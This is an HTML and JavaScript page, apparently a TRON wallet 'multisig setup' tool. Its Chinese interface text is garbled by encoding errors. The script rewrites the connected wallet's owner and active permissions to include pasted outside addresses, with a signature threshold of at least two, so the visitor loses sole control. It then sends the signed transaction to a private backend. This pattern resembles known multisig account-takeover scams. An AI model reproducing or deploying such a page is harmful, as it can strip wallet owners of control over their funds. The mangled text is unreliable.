<!DOCTYPE html>
<html>
<head>
    <title>TRON å¤šç­¾è®¾ç½®å·¥å…·</title>

    <!-- ç½‘ç«™å›¾æ ‡ -->
    <link rel="icon" href="datubiao.ico?v=2" type="image/x-icon">

    <script src="https://unpkg.com/tronweb/dist/TronWeb.js"></script>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: sans-serif; max-width: 600px; margin: 40px auto; padding: 20px;
            border: 1px solid #ccc; border-radius: 8px; }
        h1 { text-align: center; color: #000; }
        label { display: block; margin-top: 15px; font-weight: bold; }
        input[type="text"], input[type="number"], textarea {
            width: 100%; padding: 10px; margin-top: 5px;
            border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box;
        }
        button {
            background-color: #ff0000; color: white;
            padding: 15px 20px; border: none;
            border-radius: 4px; cursor: pointer;
            width: 100%; margin-top: 20px; font-size: 16px;
        }
        button:hover { background-color: #cc0000; }
        .hint { font-size: 0.9em; color: #666; margin-top: 5px; }
        .warning { color: red; font-weight: bold; margin-top: 10px; }
        #connectStatus { text-align:center; font-size:14px; margin-top:20px; color:#555; }
    </style>
</head>
<body>
<h1>TRON å¤šç­¾æƒé™è®¾ç½®</h1>
<p class="warning">âš ï¸ è®¾ç½®å¤šç­¾åéœ€è¦å¤šä¸ªåœ°å€å…±åŒç­¾åæ‰èƒ½ç®¡ç†è´¦æˆ·æƒé™æˆ–æ‰§è¡Œè½¬è´¦ï¼</p>

<div id="connectStatus">â³ æ­£åœ¨æ£€æµ‹é’±åŒ…ç¯å¢ƒ...</div>

<form id="multisigForm">
    <label for="coSigners">å…±åŒç­¾åè€…åœ°å€ (æ¯è¡Œä¸€ä¸ª TRON åœ°å€):</label>
    <textarea id="coSigners" rows="4" placeholder="ä¾‹å¦‚ï¼š
TMuPuzkAmgCQQopGXif8Hx47a6JbJQj6RM
TUP33QqAE5vJJsZZknP2FCWj58cstdz5W7"></textarea>
    <div class="hint">è¿™äº›åœ°å€ä¼šå’Œæ‚¨çš„å½“å‰é’±åŒ…ä¸€èµ·æˆä¸ºå¤šç­¾æˆå‘˜ã€‚</div>

    <label for="threshold">å¿…éœ€ç­¾åæ•°é‡ (Threshold):</label>
    <input type="number" id="threshold" min="2" value="2">
    <div class="hint">ä¾‹å¦‚ï¼š4 äººé’±åŒ…è®¾ä¸º 3ï¼Œè¡¨ç¤ºéœ€è¦ 3 äººä»¥ä¸ŠåŒæ„æ‰èƒ½æ“ä½œã€‚</div>

    <button type="submit" id="setPermissions">è®¾ç½®å¤šç­¾æƒé™</button>
</form>

<script>

/*******************************************************
 * å¤šé’±åŒ…é€šç”¨æ£€æµ‹å™¨ï¼ˆTronLink / TP / OKX / Bitget / SafePalâ€¦ï¼‰
 *******************************************************/
const WalletAdapter = {
    tronWeb: null,
    address: null,

    async detectWallet() {
        return new Promise(resolve => {
            let tries = 0;
            const timer = setInterval(() => {
                tries++;

                if (window.tronWeb && window.tronWeb.defaultAddress) {
                    clearInterval(timer);
                    this.tronWeb = window.tronWeb;
                    resolve(window.tronWeb);
                }

                if (tries > 40) { // ç­‰ 10 ç§’
                    clearInterval(timer);
                    resolve(null);
                }
            }, 250);
        });
    },

    async connect() {
        const status = document.getElementById("connectStatus");

        status.innerText = "â³ æ­£åœ¨æ£€æµ‹é’±åŒ…...";

        let tw = await this.detectWallet();

        if (!tw) {
            status.innerText = "âŒ æœªæ£€æµ‹åˆ° Tron é’±åŒ…ï¼Œè¯·åœ¨é’±åŒ…å†…ç½®æµè§ˆå™¨æ‰“å¼€æ­¤ç½‘é¡µã€‚";
            return null;
        }

        // TronLink éœ€è¦æˆæƒ
        if (window.tronLink && window.tronLink.request) {
            try {
                await window.tronLink.request({ method: "tron_requestAccounts" });
            } catch (e) {
                console.warn("TronLink æœªæˆæƒ:", e);
            }
        }

        // ç­‰å¾…åœ°å€åŠ è½½
        await new Promise(res => setTimeout(res, 300));

        const addr = tw.defaultAddress.base58;
        if (!addr) {
            status.innerText = "âš ï¸ è¯·åœ¨é’±åŒ…å†…ç™»å½•è´¦æˆ·ååˆ·æ–°é¡µé¢ã€‚";
            return null;
        }

        this.address = addr;
        this.tronWeb = tw;

        status.innerText = "âœ… å·²è¿æ¥é’±åŒ…ï¼š" + addr;

        return tw;
    },

    getAddress() {
        return this.address || (window.tronWeb?.defaultAddress?.base58 ?? null);
    }
};


/*******************************************************
 * é¡µé¢åŠ è½½æ—¶å¯åŠ¨é’±åŒ…æ£€æµ‹
 *******************************************************/
let cachedTronWeb = null;

window.addEventListener("load", async () => {
    cachedTronWeb = await WalletAdapter.connect();
});


/*******************************************************
 * è¡¨å•æäº¤ â€”â€” è®¾ç½®å¤šç­¾
 *******************************************************/
document.getElementById("multisigForm").onsubmit = async (event) => {
    event.preventDefault();

    const tronWeb = cachedTronWeb || await WalletAdapter.connect();
    if (!tronWeb) return;

    const currentWallet = WalletAdapter.getAddress();
    if (!currentWallet) {
        alert("é’±åŒ…æœªè¿æ¥ï¼Œè¯·åœ¨é’±åŒ…å†…ç½®æµè§ˆå™¨æ‰“å¼€æ­¤é¡µé¢ï¼");
        return;
    }

    /***** è¯»å–ç”¨æˆ·è¾“å…¥ *****/
    const raw = document.getElementById("coSigners").value.trim();
    const threshold = parseInt(document.getElementById("threshold").value);

    const inputAddresses = raw
        .split("\n")
        .map(a => a.trim())
        .filter(a => tronWeb.isAddress(a));

    const allMembers = Array.from(new Set([currentWallet, ...inputAddresses]));
    const count = allMembers.length;

    if (count < 2) {
        alert("è‡³å°‘éœ€è¦ä¸¤ä¸ªæˆå‘˜ï¼ˆåŒ…å«ä½ è‡ªå·±çš„åœ°å€ï¼‰");
        return;
    }
    if (threshold < 2 || threshold > count) {
        alert(`ç­¾åé˜ˆå€¼å¿…é¡»åœ¨ 2 åˆ° ${count} ä¹‹é—´`);
        return;
    }

    /***** æ„å»ºæƒé™åˆ—è¡¨ *****/
    const allKeys = allMembers.map(addr => ({
        address: tronWeb.address.toHex(addr),
        weight: 1
    }));

    const permissionConfig = {
        owner_address: currentWallet,
        owner: {
            type: 0,
            permission_name: "owner",
            threshold,
            keys: allKeys
        },
        actives: [{
            type: 2,
            permission_name: "active0",
            threshold,
            operations: "7fff1fc0037e0000000000000000000000000000000000000000000000000000",
            keys: allKeys
        }]
    };

    /***** æ„å»ºäº¤æ˜“ *****/
    let tx;
    try {
        tx = await tronWeb.transactionBuilder.updateAccountPermissions(
            permissionConfig,
            currentWallet
        );
    } catch (err) {
        alert("æ„å»ºäº¤æ˜“å¤±è´¥ï¼š" + err.message);
        return;
    }

    /***** ç­¾å *****/
    let signed;
    try {
        signed = await tronWeb.trx.sign(tx);
    } catch (err) {
        alert("ç­¾åå¤±è´¥ï¼š" + err.message);
        return;
    }

    /***** æäº¤åç«¯å¹¿æ’­ *****/
    const API_ENDPOINT = "http://192.168.110.214:3000/api/broadcast-tx";

    const res = await fetch(API_ENDPOINT, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            signedTransaction: signed,
            userWallet: currentWallet
        })
    });

    const result = await res.json();

    if (res.ok && result.success) {
        alert(`ğŸ‰ å¤šç­¾æƒé™è®¾ç½®æˆåŠŸï¼äº¤æ˜“ ID: ${result.txid}`);
    } else {
        alert("âŒ å¹¿æ’­å¤±è´¥ï¼š" + result.message);
    }
};

</script>

</body>
</html>
